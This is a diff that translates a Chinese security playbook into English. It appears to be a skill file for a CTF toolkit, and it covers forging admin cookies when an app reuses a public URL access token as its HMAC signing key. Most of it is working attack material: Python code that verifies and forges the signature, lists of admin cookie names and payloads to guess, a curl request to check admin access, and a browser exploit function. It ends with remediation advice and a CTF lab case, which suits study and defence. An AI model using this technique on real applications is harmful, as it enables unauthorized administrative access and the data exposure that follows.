@@ -1,59 +1,59 @@
-# Cookie HMAC 密钥复用 → 后台认证绕过
+# Cookie HMAC key reuse → admin authentication bypass
 
-> 当服务端将 URL 中公开的 access token 同时用作 Cookie 签名密钥，且后台直接信任 Cookie payload 中的声明字段时，可伪造管理员身份。
+> When the server reuses the publicly visible access token from the URL as the cookie signing key, and the admin side trusts the claim fields in the cookie payload directly, an administrator identity can be forged.
 
 ---
 
-## 适用场景
+## When this applies
 
-- 目标为 Web 应用，URL 路径中包含 `access_token` / `token` / `key` 等参数
-- 响应头设置了签名 Cookie（如 `student_gate=<payload>.<signature>`）
-- 存在多个签名 Cookie（学生端 + 管理端）共用一个密钥的可能
-- 后台 Cookie payload 中包含客户端可控的权限声明（如 `{"admin":true}`）
+- The target is a web application whose URL path carries parameters such as `access_token`, `token` or `key`
+- The response headers set a signed cookie (e.g. `student_gate=<payload>.<signature>`)
+- There may be several signed cookies (student side and admin side) sharing a single key
+- The admin cookie payload contains a client-controllable privilege claim (e.g. `{"admin":true}`)
 
-## 关键词
+## Keywords
 
-- HMAC key reuse / 签名密钥复用
-- Known-key session forgery / 已知密钥会话伪造
-- Client-side claims-based auth / 客户端声明式权限
-- Cookie signature bypass / Cookie 签名绕过
+- HMAC key reuse
+- Known-key session forgery
+- Client-side claims-based authorization
+- Cookie signature bypass
 
-## 攻击流程
+## Attack workflow
 
-### Step 1：从 URL 提取 access token
+### Step 1: extract the access token from the URL
 
-入口 URL 中通常可见：
+The entry URL usually shows it plainly:
 
 ```
 /access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
 ```
 
-提取 token：
+Extract the token:
 
 ```
 blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
 ```
 
-### Step 2：观察 student_gate Cookie
+### Step 2: observe the student_gate cookie
 
-访问入口，响应头会设置签名 Cookie。格式通常为：
+Visit the entry point and the response headers set a signed cookie, usually in this form:
 
 ```
 Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
 ```
 
-解码 payload 确认内容结构。
+Decode the payload to confirm its structure.
 
-### Step 3：验证签名算法
+### Step 3: verify the signing algorithm
 
-用已知的 access token 作为 HMAC key，尝试重现签名：
+Using the known access token as the HMAC key, try to reproduce the signature:
 
 ```python
 import hmac, hashlib, base64
 
-access_token = "从URL提取的token"
-payload_b64 = "从Cookie提取的payload部分"
-expected_sig = "从Cookie提取的签名部分"
+access_token = "the token extracted from the URL"
+payload_b64 = "the payload part extracted from the cookie"
+expected_sig = "the signature part extracted from the cookie"
 
 def b64url(data: bytes) -> str:
     return base64.urlsafe_b64encode(data).decode().rstrip("=")
@@ -64,14 +64,14 @@ computed = b64url(hmac.new(
     hashlib.sha256
 ).digest())
 
-print("匹配" if computed == expected_sig else "不匹配")
+print("match" if computed == expected_sig else "no match")
 ```
 
-如果匹配 → 确认 `access token 就是 HMAC key`。
+If it matches, the access token is confirmed to be the HMAC key.
 
-### Step 4：猜测管理端 Cookie 名称和 payload 结构
+### Step 4: guess the admin cookie name and payload structure
 
-常见的管理端 Cookie 名称：
+Common admin cookie names:
 
 - `admin_session`
 - `admin_token`
@@ -79,7 +79,7 @@ print("匹配" if computed == expected_sig else "不匹配")
 - `manage_token`
 - `backstage_session`
 
-Payload 结构试探方向（逐一尝试，直到命中 200）：
+Payload structures worth probing (try them one by one until you get a 200):
 
 ```json
 {"admin":true}
@@ -92,12 +92,12 @@ Payload 结构试探方向（逐一尝试，直到命中 200）：
 {"type":"admin"}
 ```
 
-### Step 5：伪造管理端 Cookie
+### Step 5: forge the admin cookie
 
 ```python
 import hmac, hashlib, json, base64
 
-access_token = "已知的token"
+access_token = "the known token"
 payload = {"admin": True}
 
 def b64url(data: bytes) -> str:
@@ -112,15 +112,15 @@ cookie = f"admin_session={payload_b64}.{sig}"
 print(cookie)
 ```
 
-### Step 6：验证后台权限
+### Step 6: verify admin privileges
 
 ```bash
-curl -k -H "Cookie: <上一步得到的cookie>" https://target/api/admin/me
+curl -k -H "Cookie: <the cookie produced in the previous step>" https://target/api/admin/me
 ```
 
-返回 `{"admin":true}` 或 200 + 管理员数据则成功。
+Getting back `{"admin":true}`, or a 200 with administrator data, means it worked.
 
-## 浏览器复现
+## Reproducing in a browser
 
 ```javascript
 async function exploit() {
@@ -138,20 +138,20 @@ async function exploit() {
 exploit();
 ```
 
-## 修复方案
+## Remediation
 
-1. 使用服务端独立密钥签名 Cookie，不和 URL token 共用
-2. 后台权限基于服务端 session，而非客户端 Cookie payload 声明
-3. 不同角色使用不同签名密钥
-4. Cookie 中加入 `iat` / `exp` / `typ` 等声明并校验
-5. 静默处理签名解析异常（失败返回 401，不返回 500）
+1. Sign cookies with a dedicated server-side key, never one shared with the URL token
+2. Base admin privileges on server-side session state, not on claims in the client's cookie payload
+3. Use different signing keys for different roles
+4. Add and validate claims such as `iat`, `exp` and `typ` in the cookie
+5. Handle signature parsing errors quietly (return 401 on failure, not 500)
 
-## 相关案例
+## Related case
 
-- class.pangbaoba.me CTF 靶场后台绕过（student_gate 与 admin_session 共用 access token 作为 HMAC key，`{"admin":true}` 直接获得管理员权限）
+- Admin bypass on the class.pangbaoba.me CTF lab (student_gate and admin_session shared the access token as the HMAC key, and `{"admin":true}` granted administrator privileges outright)
 
-## 关联技能
+## Related skills
 
-- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — Web 运行时分析
-- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — 类似 token 声明混淆
-- `reverse-engineering/languages-platforms.md` — JWT / OAuth 相关
+- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — web runtime analysis
+- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — similar token claim confusion
+- `reverse-engineering/languages-platforms.md` — JWT and OAuth material
